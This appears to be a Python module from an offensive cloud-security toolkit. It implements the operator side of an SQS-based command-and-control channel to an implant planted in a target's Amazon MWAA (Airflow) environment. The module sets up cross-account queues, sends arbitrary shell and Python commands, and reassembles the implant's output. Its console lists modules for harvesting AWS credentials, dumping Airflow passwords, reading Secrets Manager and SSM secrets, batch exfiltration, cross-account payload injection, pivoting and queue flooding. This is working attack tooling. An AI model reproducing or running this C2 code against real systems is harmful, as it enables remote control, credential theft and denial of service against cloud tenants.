"""
Module 2: Command and Control (C2) Channel Testing

Tests the ability to establish a bidirectional C2 channel through SQS,
exploiting both sqs:SendMessage and sqs:ReceiveMessage permissions in
the MWAA execution role.

Components:
  - setup:    Creates the two attacker-side queues (commands + results)
  - operator: Interactive operator console to send commands and view results
  - send-cmd: Send a single command to the implant
  - recv:     Poll for results from the implant
  - cleanup:  Remove the attacker-side queues
"""

import base64
import json
import time
from typing import Optional

from ..config import (
    AttackerConfig,
    DEFAULT_C2_CMD_QUEUE,
    DEFAULT_C2_RESULTS_QUEUE,
)
from ..utils import (
    get_sqs_client,
    create_test_queue,
    set_queue_policy_allow_cross_account,
    delete_test_queue,
    receive_messages,
    send_message,
    print_section,
    print_success,
    print_fail,
    print_info,
    print_warn,
    print_result,
    logger,
)


def setup_c2_infra(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> dict:
    """Create both C2 queues (commands inbound, results outbound)."""
    print_section("C2 Infrastructure Setup")
    sqs = get_sqs_client(attacker.region, attacker.profile)

    # Create command queue
    cmd_url = create_test_queue(sqs, cmd_queue)
    cmd_attrs = sqs.get_queue_attributes(QueueUrl=cmd_url, AttributeNames=["QueueArn"])
    cmd_arn = cmd_attrs["Attributes"]["QueueArn"]
    set_queue_policy_allow_cross_account(sqs, cmd_url, cmd_arn)

    # Create results queue
    results_url = create_test_queue(sqs, results_queue)
    results_attrs = sqs.get_queue_attributes(QueueUrl=results_url, AttributeNames=["QueueArn"])
    results_arn = results_attrs["Attributes"]["QueueArn"]
    set_queue_policy_allow_cross_account(sqs, results_url, results_arn)

    print_success("C2 infrastructure ready:")
    print_result("Command queue", cmd_url)
    print_result("Results queue", results_url)
    print_info("Deploy the C2 implant DAG to the target MWAA environment.")
    print_info("Then use 'operator' mode to interact with the implant.")

    return {
        "command_queue_url": cmd_url,
        "results_queue_url": results_url,
        "command_queue_arn": cmd_arn,
        "results_queue_arn": results_arn,
    }


def send_command(
    attacker: AttackerConfig,
    command: str,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
) -> str:
    """Send a command to the C2 command queue for the implant to execute."""
    sqs = get_sqs_client(attacker.region, attacker.profile)
    cmd_url = attacker.queue_url(cmd_queue)

    response = send_message(sqs, cmd_url, command)
    msg_id = response["MessageId"]
    logger.debug("Command sent (MessageId: %s): %s", msg_id, command)
    return msg_id


def receive_results(
    attacker: AttackerConfig,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
    wait_seconds: int = 10,
    max_results: int = 10,
) -> list:
    """Poll the results queue for implant output, reassembling chunked messages."""
    sqs = get_sqs_client(attacker.region, attacker.profile)
    results_url = attacker.queue_url(results_queue)

    messages = receive_messages(
        sqs, results_url,
        max_messages=max_results,
        wait_seconds=wait_seconds,
        delete_after=True,
    )

    # Collect chunks for reassembly
    chunks = {}  # chunk_id -> {index: body_dict, ...}
    decoded = []

    for msg in messages:
        try:
            body = json.loads(msg["Body"])
        except (json.JSONDecodeError, KeyError):
            decoded.append({"raw": msg["Body"]})
            continue

        # Beacon messages
        if body.get("type") == "beacon":
            decoded.append({"beacon": body})
            continue

        # Chunked results
        if "chunk_id" in body and "total_chunks" in body:
            cid = body["chunk_id"]
            idx = body.get("chunk_index", 0)
            total = body["total_chunks"]
            if cid not in chunks:
                chunks[cid] = {"total": total, "meta": body, "parts": {}}
            chunks[cid]["parts"][idx] = base64.b64decode(
                body.get("stdout", "")
            ).decode("utf-8", errors="replace")
            continue

        # Normal result
        result = {
            "command": body.get("command", "unknown"),
            "return_code": body.get("return_code", -1),
            "stdout": base64.b64decode(body.get("stdout", "")).decode("utf-8", errors="replace"),
            "stderr": base64.b64decode(body.get("stderr", "")).decode("utf-8", errors="replace"),
            "hostname": body.get("hostname", ""),
            "timestamp": body.get("timestamp", ""),
        }
        decoded.append(result)

    # Reassemble completed chunks
    for cid, chunk_info in chunks.items():
        total = chunk_info["total"]
        parts = chunk_info["parts"]
        meta = chunk_info["meta"]
        if len(parts) == total:
            combined = "".join(parts[i] for i in sorted(parts.keys()))
            decoded.append({
                "command": meta.get("command", "unknown"),
                "return_code": meta.get("return_code", 0),
                "stdout": combined,
                "stderr": "",
                "hostname": meta.get("hostname", ""),
                "timestamp": meta.get("timestamp", ""),
                "reassembled_chunks": total,
            })
        else:
            decoded.append({
                "command": meta.get("command", "unknown"),
                "return_code": -1,
                "stdout": f"[incomplete: {len(parts)}/{total} chunks received]",
                "stderr": "",
                "hostname": meta.get("hostname", ""),
                "timestamp": meta.get("timestamp", ""),
            })

    return decoded


def _display_result(result: dict) -> None:
    """Format and display a C2 result."""
    if "raw" in result:
        print(f"  Raw response: {result['raw']}")
        return

    if "beacon" in result:
        beacon = result["beacon"]
        fp = beacon.get("fingerprint", {})
        print(f"\n  {'='*60}")
        print(f"  BEACON from {fp.get('hostname', '?')} @ {beacon.get('timestamp', '?')}")
        print(f"  {'='*60}")
        print(f"    User:     {fp.get('user', '?')}")
        print(f"    Platform: {fp.get('platform', '?')}")
        print(f"    Python:   {fp.get('python', '?')[:60]}")
        print(f"    PID:      {fp.get('pid', '?')}")
        print(f"    CWD:      {fp.get('cwd', '?')}")
        builtins = beacon.get("builtins", [])
        if builtins:
            print(f"    Modules:  {', '.join(builtins)}")
        print(f"  {'='*60}\n")
        return

    cmd = result.get("command", "?")
    rc = result.get("return_code", -1)
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")
    hostname = result.get("hostname", "")
    timestamp = result.get("timestamp", "")
    chunks = result.get("reassembled_chunks", 0)

    header = f"Result for: {cmd[:80]} (rc={rc})"
    if hostname:
        header += f" [{hostname}]"
    if timestamp:
        header += f" @ {timestamp}"
    if chunks:
        header += f" ({chunks} chunks reassembled)"

    print(f"\n  --- {header} ---")
    if stdout:
        for line in stdout.splitlines():
            print(f"  | {line}")
    if stderr:
        print(f"  [stderr]:")
        for line in stderr.splitlines():
            print(f"  ! {line}")
    print(f"  --- End ---\n")


def operator_console(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> None:
    """
    Interactive operator console for the C2 channel.

    Provides a command prompt to send commands to the implant and
    automatically polls for results.
    """
    def _print_help():
        print()
        print("  Shell Commands:")
        print("    <any command>         - Execute shell command on implant")
        print("    python:<code>         - Execute inline Python on implant")
        print()
        print("  Built-in Modules (executed natively in the implant):")
        print("    !harvest-creds        - Harvest AWS creds, IMDS, env vars, container creds")
        print("    !airflow-dump         - Dump connections (with passwords), variables, pools")
        print("    !s3-recon             - Enumerate S3 buckets, sample objects, read policies")
        print("    !secrets              - List & read Secrets Manager secrets")
        print("    !ssm-params           - List & read SSM Parameter Store (with decryption)")
        print("    !iam-enum             - Enumerate role, attached/inline policies")
        print("    !network-recon        - Network interfaces, routes, VPCs, subnets, SGs, IMDS")
        print("    !self-destruct        - Remove the implant DAG and cached .pyc files")
        print()
        print("  Data Collection:")
        print("    !exfil                - Run all data collection modules at once")
        print()
        print("  Remote Attack Operations:")
        print("    !recon <accts> [region]              - Scan accounts for MWAA queues from implant")
        print("    !inject <acct> <queue> <name> [rgn]  - Inject payload into target queue")
        print("    !dos-flood <acct> <queue> [n] [rgn]  - Flood target queue with messages")
        print()
        print("  File Operations:")
        print("    !read-file <path>     - Read a file from the worker filesystem")
        print("    !write-file <p> <b64> - Write base64 content to a file on the worker")
        print()
        print("  Advanced:")
        print("    !pivot <acct> <queue> <msg> - Send a message to another account's queue")
        print("    !multi                - Send multiple commands (newline-separated, end with empty line)")
        print()
        print("  Console:")
        print("    !results              - Poll for pending results")
        print("    !drain                - Drain all pending results (keep polling until empty)")
        print("    !help                 - Show this help")
        print("    !quit                 - Exit the operator console")
        print()

    print_section("C2 Operator Console")
    print_info(f"Command queue:  {attacker.queue_url(cmd_queue)}")
    print_info(f"Results queue:  {attacker.queue_url(results_queue)}")
    _print_help()

    while True:
        try:
            user_input = input("  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n")
            print_info("Exiting operator console.")
            break

        if not user_input:
            continue

        if user_input == "!quit":
            print_info("Exiting operator console.")
            break

        if user_input == "!help":
            _print_help()
            continue

        if user_input == "!results":
            print_info("Polling for results...")
            results = receive_results(attacker, results_queue, wait_seconds=5)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results available.")
            continue

        if user_input == "!drain":
            print_info("Draining all pending results...")
            total = 0
            while True:
                results = receive_results(attacker, results_queue, wait_seconds=3, max_results=10)
                if not results:
                    break
                for r in results:
                    _display_result(r)
                total += len(results)
            print_info(f"Drained {total} result(s).")
            continue

        # !exfil shortcut: batch all data collection modules
        if user_input == "!exfil":
            batch_cmds = [
                "!harvest-creds",
                "!airflow-dump",
                "!s3-recon",
                "!secrets",
                "!ssm-params",
            ]
            actual_command = "!multi\n" + "\n".join(batch_cmds)
            print_info(f"Sending batch exfil ({len(batch_cmds)} modules)...")
            msg_id = send_command(attacker, actual_command, cmd_queue)
            print_success(f"Exfil batch queued (MessageId: {msg_id})")
            print_info("Waiting for results...")
            time.sleep(3)
            results = receive_results(attacker, results_queue, wait_seconds=20)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results yet. Try '!results' later.")
            continue

        # !recon - validate input then send to implant
        if user_input.startswith("!recon "):
            args = user_input[len("!recon "):].strip()
            if not args:
                print_info("Usage: !recon <account_id1,account_id2,...> [region]")
                continue
            # First token is comma-separated accounts; optional last token is region
            tokens = args.split()
            accounts = [a.strip() for a in tokens[0].split(",") if a.strip()]
            if not accounts:
                print_info("Usage: !recon <account_id1,account_id2,...> [region]")
                continue
            region_note = f" in {tokens[1]}" if len(tokens) > 1 else ""
            print_info(f"Sending recon scan for {len(accounts)} account(s){region_note}...")
            msg_id = send_command(attacker, user_input, cmd_queue)
            print_success(f"Recon command queued (MessageId: {msg_id})")
            print_info("Waiting for results...")
            time.sleep(2)
            results = receive_results(attacker, results_queue, wait_seconds=15)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results yet. The implant may not have polled. Try '!results' later.")
            continue

        # !inject - resolve named payloads to JSON then send to implant
        if user_input.startswith("!inject "):
            from .event_injection import INJECTION_PAYLOADS
            parts = user_input[len("!inject "):].strip().split(None, 3)
            if len(parts) < 3:
                print_info("Usage: !inject <account_id> <queue_name> <payload_name_or_json> [region]")
                print_info(f"Available payloads: {', '.join(INJECTION_PAYLOADS.keys())}")
                continue
            acct, queue, payload_arg = parts[0], parts[1], parts[2]
            region_suffix = ""
            # Check if there's a 4th token that looks like a region
            if len(parts) == 4:
                region_suffix = f" {parts[3]}"
            # Resolve named payload to JSON
            if payload_arg in INJECTION_PAYLOADS:
                resolved = json.dumps(INJECTION_PAYLOADS[payload_arg]["payload"])
                print_info(f"Resolved payload '{payload_arg}' to JSON")
            else:
                resolved = payload_arg
            actual_command = f"!inject {acct} {queue} {resolved}{region_suffix}"
            print_info(f"Sending inject command to implant...")
            msg_id = send_command(attacker, actual_command, cmd_queue)
            print_success(f"Inject command queued (MessageId: {msg_id})")
            print_info("Waiting for results...")
            time.sleep(2)
            results = receive_results(attacker, results_queue, wait_seconds=15)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results yet. Try '!results' later.")
            continue

        # !dos-flood - validate input then send to implant
        if user_input.startswith("!dos-flood "):
            parts = user_input[len("!dos-flood "):].strip().split()
            if len(parts) < 2:
                print_info("Usage: !dos-flood <account_id> <queue_name> [count] [region]")
                continue
            print_info(f"Sending dos-flood command to implant...")
            msg_id = send_command(attacker, user_input, cmd_queue)
            print_success(f"DoS flood command queued (MessageId: {msg_id})")
            print_info("Waiting for results...")
            time.sleep(2)
            results = receive_results(attacker, results_queue, wait_seconds=15)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results yet. Try '!results' later.")
            continue

        # Multi-command mode: collect lines until empty line
        if user_input == "!multi":
            print_info("Enter commands one per line. Empty line to send:")
            lines = []
            while True:
                try:
                    line = input("  c2:multi> ")
                except (EOFError, KeyboardInterrupt):
                    break
                if not line.strip():
                    break
                lines.append(line)
            if not lines:
                print_info("No commands entered.")
                continue
            actual_command = "!multi\n" + "\n".join(lines)
            print_info(f"Sending {len(lines)} command(s) as multi-command batch...")
            msg_id = send_command(attacker, actual_command, cmd_queue)
            print_success(f"Multi-command queued (MessageId: {msg_id})")
            print_info("Waiting for results...")
            time.sleep(3)
            results = receive_results(attacker, results_queue, wait_seconds=15)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results yet. Try '!results' later.")
            continue

        # Implant builtins and file/pivot commands are sent as-is
        actual_command = user_input

        display_cmd = actual_command[:100]
        if len(actual_command) > 100:
            display_cmd += "..."
        print_info(f"Sending: {display_cmd}")
        msg_id = send_command(attacker, actual_command, cmd_queue)
        print_success(f"Command queued (MessageId: {msg_id})")

        # Auto-poll for results after a brief delay
        print_info("Waiting for results...")
        time.sleep(2)
        results = receive_results(attacker, results_queue, wait_seconds=15)
        if results:
            for r in results:
                _display_result(r)
        else:
            print_info("No results yet. The implant may not have polled. Try '!results' later.")


def test_c2_roundtrip(
    attacker: AttackerConfig,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> bool:
    """
    End-to-end C2 channel test without deploying to MWAA.

    Simulates both the operator and implant sides locally to validate
    that the SQS cross-account communication works.
    """
    print_section("C2 Roundtrip Test")

    # Operator side: send a command
    print_info("Operator: Sending test command...")
    msg_id = send_command(attacker, "echo C2_TEST_OK", cmd_queue)
    print_success(f"Command sent (MessageId: {msg_id})")

    # Simulate implant side: receive command, execute, send result
    print_info("Simulating implant: Receiving command...")
    implant_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )
    cmd_url = attacker.queue_url(cmd_queue)
    results_url = attacker.queue_url(results_queue)

    messages = receive_messages(implant_sqs, cmd_url, max_messages=1, wait_seconds=10, delete_after=True)
    if not messages:
        print_fail("Implant: No command received. Cross-account ReceiveMessage may be blocked.")
        return False

    command = messages[0]["Body"]
    print_success(f"Implant: Received command: {command}")

    # Execute locally
    import subprocess
    try:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        stdout = proc.stdout
        stderr = proc.stderr
        rc = proc.returncode
    except Exception as e:
        stdout = ""
        stderr = str(e)
        rc = -1

    result_payload = {
        "command": command,
        "return_code": rc,
        "stdout": base64.b64encode(stdout.encode()).decode(),
        "stderr": base64.b64encode(stderr.encode()).decode(),
    }

    print_info("Implant: Sending results back...")
    send_message(implant_sqs, results_url, json.dumps(result_payload))
    print_success("Implant: Results sent.")

    # Operator side: receive results
    print_info("Operator: Polling for results...")
    results = receive_results(attacker, results_queue, wait_seconds=10)
    if results and results[0].get("stdout", "").strip() == "C2_TEST_OK":
        print_success("FINDING: Full C2 roundtrip succeeded!")
        print_warn("Bidirectional SQS C2 channel is viable through the MWAA execution role.")
        _display_result(results[0])
        return True
    elif results:
        print_warn("Roundtrip completed but output was unexpected:")
        _display_result(results[0])
        return True
    else:
        print_fail("No results received. C2 channel may not be functional.")
        return False


def cleanup(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> None:
    """Remove the C2 queues."""
    print_section("C2 Cleanup")
    sqs = get_sqs_client(attacker.region, attacker.profile)
    for qname in [cmd_queue, results_queue]:
        try:
            delete_test_queue(sqs, attacker.queue_url(qname))
            print_success(f"Deleted: {qname}")
        except Exception as e:
            print_fail(f"Failed to delete {qname}: {e}")
